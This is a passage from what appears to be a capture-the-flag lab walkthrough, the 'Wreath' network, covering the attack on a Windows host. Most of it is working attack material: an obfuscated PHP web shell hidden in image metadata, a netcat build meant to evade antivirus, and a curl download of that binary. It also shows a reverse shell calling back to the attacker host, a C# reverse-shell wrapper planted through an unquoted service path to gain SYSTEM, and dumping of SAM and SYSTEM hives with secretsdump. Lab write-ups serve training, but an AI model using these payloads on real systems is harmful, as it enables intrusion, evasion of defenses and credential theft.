Additionally we can make use of PHP [obsfucators](https://www.gaijin.at/en/tools/php-obfuscator).

```php
<?php $z0=$_GET[base64_decode('d3JlYXRo')];if(isset($z0)){echo base64_decode('PHByZT4=').shell_exec($z0).base64_decode('PC9wcmU+');}die();?>
```

```bash
 exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" gabad00-shell.jpeg.php
```

After, uploading the shell, we have code execution.

```
http://10.200.84.100/resources/uploads/gabad002.jpeg.php?wreath=whoami
wreath-pc\thomas
```


```
http://10.200.84.100/resources/uploads/gabad002.jpeg.php?wreath=hostname
wreath-pc
```

We are going to need a full shell, but AV is still an issue. So we can compile our own version of nc from this git [repo](https://github.com/int0x33/nc.exe/).

We will need a 64 bit compiler that will work for windows programs.

```bash 
sudo apt install mingw-w64
```

`x86_64-w64-mingw32-gcc` specifies 64 bit binaries.

We will add this `CC=x86_64-w64-mingw32-gcc` line to our makefile to specify the compiler, and then run `make`.


We can put this up onto our compromised machine with the following command.

```bash
curl http://10.50.85.139/nc.exe -o c:\\windows\\temp\\nc-gabad00.exe
```

Then we can (hopefully) start a reverse shell.

```powershell
powershell.exe c:\\windows\\temp\\nc-gabad00.exe 10.50.85.139 443 -e cmd.exe 
```


We are in!

```
[~/thm/wreath/nc.exe]$ nc -nvlp 443                                        *[master]
listening on [any] 443 ...
connect to [10.50.85.139] from (UNKNOWN) [10.200.84.100] 51398
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\resources\uploads>
```

#### The Final PrivEsc


We do have SeImpersonate so that may be one option.

```cmd
C:\xampp\htdocs\resources\uploads>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```


This may be something, but if look at the non-default services on the machine with:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
sc qc servicename
```

We see that ` System Explorer Service` is unquoted.

With `sc qc SystemExplorerHelpService` we know that it is running as the system.

We can use `powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"` to find that anyone can write here.

Now we need an exploit that will pass defender.

We need the `mono-devel` package to compile dotnet packages.

We will create an exploit that looks like this:

```
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
                Process proc = new Process();
                ProcessStartInfo procInfo = new ProcessStartInfo("C:\\Users\\Thomas\\AppData\\Local\\Temp\\nc-gabad00.exe", "10.50.85.139 443 -e cmd.exe");
                procInfo.CreateNoWindow = true;
                proc.StartInfo = procInfo;
                proc.Start();
        }
    }
}

```

Then we will compile it with mono using `mcs Wrapper.cs`. Now we have `Wrapper.exe`.

Getting it onto the box is easy enough with an smb server and impacket.

```bash
smbserver.py share . -smb2support -username kali -password kali
```

We can authenticate using:

```cmd
net use \\10.50.85.139\share /USER:kali kali
```

And copy the file like so:

```cmd
copy \\10.50.85.139\share\Wrapper.exe %TEMP%\wrapper-gabad00.exe
```

Then delete the share:

```cmd
net use \\10.50.85.139\share /del
```


Now if we call our executable, we should get a shell, albeit not as an administrator
```cmd
"%TEMP%\wrapper-gabad00.exe"
```

Now, we can copy our exploit into the vulnerable directory.

```cmd
copy gaba-wrapper2.exe "C:\Program Files (x86)\System Explorer\System.exe"
```

Then, stop and restart the service:

```cmd
sc query SystemExplorerHelpService
sc stop SystemExplorerHelpService
sc start SystemExplorerHelpService
```


Now, we are an admin!

```bash
[~/thm/wreath]$ nc -nvlp 443
listening on [any] 443 ...
connect to [10.50.85.139] from (UNKNOWN) [10.200.84.100] 51747
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

#### Post-Post-Post Exploitation

What are going to do now is grab the files that we need to crack some hashes. We need
1. The SAM hive from `HKLM\SAM`
2. The SYSTEM hive from `HKLM\SYSTEM`

We can save those like so

```cmd
reg.exe save HKLM\SAM sam.bak
reg.exe save HKLM\SYSTEM system.bak
```

Then copy them back to our share

```cmd
move sam.bak \\10.50.85.139\share\sam.bak
move system.bak \\10.50.85.139\share\system.bak
``` 

We could also have just saved them directly there i.e.

```cmd
reg.exe save HKLM\SAM \\10.50.85.139\share\sam.bak 
```

Now we can use `secretsdump.py` from impacket to get some hashes.

```bash
secretsdump.py -sam sam.bak -system system.bak LOCAL
```

And that about wraps it up. From here, if we couldn't crack the admin hash we could also add our own user for persistence, turn off defender etc...
